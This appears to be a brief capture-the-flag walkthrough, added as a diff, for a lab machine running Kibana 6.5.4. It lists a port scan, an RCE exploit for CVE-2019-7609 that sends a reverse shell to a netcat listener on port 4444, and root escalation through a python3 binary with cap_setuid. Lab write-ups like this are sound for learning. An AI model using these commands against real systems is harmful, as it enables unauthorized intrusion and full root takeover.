@@ -1,0 +1,47 @@
+kibana 
+
+open ports 
+22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
+5044/tcp open  lxi-evntsvc?
+5601/tcp open  esmagent?
+
+port 80 is empty
+
+port 5601 has kibana installed and the management section reveals the version that is 6.5.4
+searching for an exploit for the version i found CVE-2019-7609
+the exploit allows remote code execution
+--------------------------------------------------------------------------------------------------
+searching for the exploit and found out a git repository with a tool for the exploit 
+git clone https://github.com/LandGrey/CVE-2019-7609.git
+cd cd CVE-2019-7609
+python CVE-2019-7609-kibana-rce.py -u http://10.10.170.214:5601 -host 10.8.179.136 -port 4444 --shell 
+
+setup a netcat listener for this 
+rlwrap nc -nlvp 4444
+
+and we have a reverse shell !!
+
+find the user.txt in /home/kiba/user.txt
+--------------------------------------------------------------------------------------------------
+privilage escalation
+--------------------
+To recursively list all of these capabilities use :
+getcap -r / 2>/dev/null
+
+and found out: 
+/home/kiba/.hackmeplease/python3 = cap_setuid+ep                         
+
+searching for a python revers shell in gtfobins and using it 
+/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+and we have a shell 
+
+to get a steady shell use :
+SHELL=/bin/bash script -q /dev/null
+
+ans we are root !!
+
+find the root.txt in /root/root.txt
+
+Adios!!! 
